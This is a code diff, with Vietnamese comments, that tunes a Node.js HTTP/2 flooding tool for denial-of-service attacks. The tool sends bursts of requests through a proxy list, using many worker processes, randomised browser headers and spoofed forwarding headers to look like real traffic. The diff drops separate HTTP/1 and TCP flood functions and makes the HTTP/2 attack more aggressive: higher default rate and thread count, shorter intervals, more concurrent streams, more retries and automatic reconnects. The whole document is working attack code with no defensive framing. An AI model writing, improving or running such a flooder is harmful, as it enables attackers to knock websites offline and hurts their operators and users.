@@ -1,5 +1,4 @@
 const net = require("net");
-const http = require("http");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
@@ -51,8 +50,8 @@ function randstr(length) {
 const args = {
     target: process.argv[2],
     time: parseInt(process.argv[3]),
-    rate: parseInt(process.argv[4]),
-    threads: parseInt(process.argv[5]),
+    Rate: parseInt(process.argv[4]) || 500, // Tăng Rate mặc định lên 500
+    threads: parseInt(process.argv[5]) || 32, // Tăng threads mặc định lên 32
     proxyFile: process.argv[6]
 };
 
@@ -62,16 +61,24 @@ if (!parsedTarget.protocol || !parsedTarget.host) {
     process.exit(1);
 }
 
-const sig = ['ecdsa_secp256r1_sha256', 'rsa_pkcs1_sha384', 'rsa_pkcs1_sha512'];
-const accept_header = ['*/*', 'text/html', 'application/json', 'text/plain'];
-const lang_header = ['en-US', 'vi-VN', 'zh-CN', 'fr-FR', 'de-DE'];
+const sig = ['ecdsa_secp256r1_sha256', 'rsa_pkcs1_sha384', 'rsa_pkcs1_sha512', 'ecdsa_secp384r1_sha384'];
+const accept_header = [
+    '*/*',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+    'application/json, text/javascript, */*; q=0.01',
+    'text/plain, */*; q=0.01'
+];
+const lang_header = ['en-US', 'vi-VN', 'zh-CN', 'fr-FR', 'es-ES'];
 const encoding_header = ['gzip, deflate, br', 'deflate', 'gzip', 'br'];
 const version = ['"Google Chrome";v="113"', '"Microsoft Edge";v="113"', '"Firefox";v="91"', '"Safari";v="15"'];
 const rateHeaders = [
     { "akamai-origin-hop": randstr(12) },
     { "via": randstr(12) },
     { "x-forwarded-for": randstr(12) },
-    { "client-ip": randstr(12) }
+    { "referer": `https://${randstr(10)}.com` },
+    { "cache-control": randomElement(["no-cache", "max-age=0"]) },
+    { "pragma": "no-cache" },
+    { "x-requested-with": "XMLHttpRequest" }
 ];
 
 const siga = randomElement(sig);
@@ -80,20 +87,19 @@ const accept = randomElement(accept_header);
 const lang = randomElement(lang_header);
 const encoding = randomElement(encoding_header);
 const proxies = readLines(args.proxyFile);
-const requestTypes = ['http1', 'http2', 'tcp'];
 
 if (cluster.isMaster) {
     console.clear();
     console.log(`Target: ${parsedTarget.host}`);
     console.log(`Duration: ${args.time}`);
     console.log(`Threads: ${args.threads}`);
-    console.log(`RPS: ${args.rate}`);
+    console.log(`RPS: ${args.Rate}`);
     for (let counter = 1; counter <= args.threads; counter++) {
         cluster.fork();
     }
     setTimeout(() => process.exit(0), args.time * 1000);
 } else {
-    setInterval(runFlooder, 100);
+    setInterval(runFlooder, 50); // Giảm thời gian chu kỳ xuống 50ms
 }
 
 class NetSocket {
@@ -138,7 +144,6 @@ class NetSocket {
 }
 
 const Socker = new NetSocket();
-
 headers[":method"] = "GET";
 headers[":authority"] = parsedTarget.host;
 headers[":path"] = parsedTarget.path + "?" + randstr(10) + "=" + randstr(5);
@@ -148,133 +153,11 @@ headers["sec-ch-ua-platform"] = "Windows";
 headers["accept-encoding"] = encoding;
 headers["accept-language"] = lang;
 headers["accept"] = accept;
-headers["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36";
-
-function runHTTP1Flood(proxyOptions, callback) {
-    const agent = new http.Agent({ keepAlive: true, maxSockets: 10 });
-    const requestOptions = {
-        host: proxyOptions.host,
-        port: proxyOptions.port,
-        path: args.target,
-        method: "GET",
-        headers: {
-            Host: parsedTarget.host,
-            "User-Agent": headers["user-agent"],
-            Accept: headers.accept,
-            "Accept-Encoding": headers["accept-encoding"],
-            "Accept-Language": headers["accept-language"],
-            Connection: "keep-alive",
-            ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)]
-        },
-        timeout: proxyOptions.timeout * 1000
-    };
-
-    const req = http.request(requestOptions, res => {
-        res.on("data", () => {});
-        res.on("end", () => callback(null));
-    });
-
-    req.on("error", err => callback(err));
-    req.end();
-}
-
-function runHTTP2Flood(proxyOptions, callback) {
-    Socker.HTTP(proxyOptions, (connection, error) => {
-        if (error) {
-            if (connection) connection.destroy();
-            return callback(error);
-        }
-
-        const tlsOptions = {
-            secure: true,
-            ALPNProtocols: ['h2', 'http/1.1'],
-            ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256',
-            ecdhCurve: 'auto',
-            host: parsedTarget.host,
-            servername: parsedTarget.host,
-            rejectUnauthorized: false
-        };
-
-        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
-        tlsConn.setKeepAlive(true, 60000);
-
-        const client = http2.connect(parsedTarget.href, {
-            protocol: "https:",
-            settings: {
-                headerTableSize: 65536,
-                maxConcurrentStreams: 112,
-                initialWindowSize: 6291456,
-                maxHeaderListSize: 65536,
-                enablePush: false
-            },
-            createConnection: () => tlsConn
-        });
-
-        client.on("connect", () => {
-            const dynHeaders = {
-                ...headers,
-                ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)]
-            };
-            for (let i = 0; i < args.rate; i++) {
-                const request = client.request(dynHeaders);
-                request.on("response", () => {
-                    request.close();
-                    request.destroy();
-                });
-                request.on("error", () => {
-                    request.close();
-                    request.destroy();
-                });
-                request.end();
-            }
-            callback(null);
-        });
-
-        client.on("error", err => {
-            client.destroy();
-            tlsConn.destroy();
-            connection.destroy();
-            callback(err);
-        });
-
-        client.on("close", () => {
-            client.destroy();
-            tlsConn.destroy();
-            connection.destroy();
-            callback(null);
-        });
-    });
-}
-
-function runTCPFlood(proxyOptions, callback) {
-    const payload = Buffer.from(`GET ${parsedTarget.path} HTTP/1.1\r\nHost: ${parsedTarget.host}\r\n\r\n${randstr(100)}\r\n`);
-    const connection = net.connect({
-        host: proxyOptions.host,
-        port: proxyOptions.port,
-        noDelay: true
-    });
-
-    connection.setTimeout(proxyOptions.timeout * 1000);
-    connection.setKeepAlive(true, 60000);
-
-    connection.on("connect", () => {
-        for (let i = 0; i < args.rate; i++) {
-            connection.write(payload);
-        }
-        connection.end();
-        callback(null);
-    });
-
-    connection.on("error", err => {
-        connection.destroy();
-        callback(err);
-    });
-
-    connection.on("timeout", () => {
-        connection.destroy();
-        callback(new Error(`timeout exceeded for ${proxyOptions.host}:${proxyOptions.port}`));
-    });
-}
+headers["user-agent"] = randomElement([
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15"
+]);
 
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
@@ -292,23 +175,80 @@ function runFlooder() {
     };
 
     let retryCount = 0;
-    const maxRetries = 5;
-    const requestType = randomElement(requestTypes);
+    const maxRetries = 10; // Tăng số lần thử lại lên 10
 
-    const floodFunction = requestType === 'http1' ? runHTTP1Flood :
-                         requestType === 'http2' ? runHTTP2Flood :
-                         runTCPFlood;
-
-    floodFunction(proxyOptions, error => {
+    Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) {
+            if (connection) connection.destroy();
             if (retryCount < maxRetries) {
                 retryCount++;
                 console.error(`Retrying (${retryCount}/${maxRetries}) for ${proxyAddr}: ${error}`);
-                setTimeout(runFlooder, 1000);
+                setTimeout(runFlooder, 500); // Giảm thời gian chờ khi retry
             } else {
                 console.error(`Max retries reached for ${proxyAddr}`);
             }
             return;
         }
+
+        const tlsOptions = {
+            secure: true,
+            ALPNProtocols: ['h2', 'http/1.1'],
+            ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384',
+            ecdhCurve: 'auto',
+            host: parsedTarget.host,
+            servername: parsedTarget.host,
+            rejectUnauthorized: false
+        };
+
+        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
+        tlsConn.setKeepAlive(true, 60000);
+
+        const client = http2.connect(parsedTarget.href, {
+            protocol: "https:",
+            settings: {
+                headerTableSize: 65536,
+                maxConcurrentStreams: 256, // Tăng số lượng stream đồng thời
+                initialWindowSize: 6291456,
+                maxHeaderListSize: 65536,
+                enablePush: false
+            },
+            createConnection: () => tlsConn
+        });
+
+        client.on("connect", () => {
+            const IntervalAttack = setInterval(() => {
+                const dynHeaders = {
+                    ...headers,
+                    ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)]
+                };
+                for (let i = 0; i < args.Rate; i++) {
+                    const request = client.request(dynHeaders);
+                    request.on("response", () => {
+                        request.close();
+                        request.destroy();
+                    });
+                    request.on("error", () => {
+                        request.close();
+                        request.destroy();
+                    });
+                    request.end();
+                }
+            }, 50); // Đồng bộ với setInterval của runFlooder
+            setTimeout(() => clearInterval(IntervalAttack), args.time * 1000);
+        });
+
+        client.on("error", () => {
+            client.destroy();
+            tlsConn.destroy();
+            connection.destroy();
+            setTimeout(runFlooder, 500);
+        });
+
+        client.on("close", () => {
+            client.destroy();
+            tlsConn.destroy();
+            connection.destroy();
+            setTimeout(runFlooder, 500);
+        });
     });
 }
